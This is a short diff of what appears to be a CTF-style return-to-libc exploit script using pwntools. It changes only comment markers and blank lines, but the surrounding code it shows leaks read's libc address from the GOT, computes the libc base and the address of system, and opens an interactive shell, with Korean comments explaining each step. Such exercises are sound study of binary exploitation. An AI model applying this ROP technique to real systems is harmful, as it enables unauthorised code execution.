@@ -55,9 +55,9 @@ payload += p64(read_plt)
 # Exploit
 p.sendafter(b'Buf: ', payload)
 read = u64(p.recvn(6) + b'\x00' * 2)
-## read 함수의 got에서 read 함수의 오프셋을 이용하여 libc base 주소를 구함
+# read 함수의 got에서 read 함수의 오프셋을 이용하여 libc base 주소를 구함
 libc_base = read - libc.symbols['read']
-## libc base에서 system 함수의 오프셋을 더하여 실제 주소를 구함
+# libc base에서 system 함수의 오프셋을 더하여 실제 주소를 구함
 system = libc_base + libc.symbols['system']
 slog('read', read)
 slog('libc_base', libc_base)
@@ -85,8 +85,6 @@ p.interactive()
                         |       pop_rdi     |   <- read("/bin/sh") == system("/bin/sh")
                         |   read_got + 0x8  |
                         |       read_plt    | 
-
-
 |-----------|  High Address
 
 
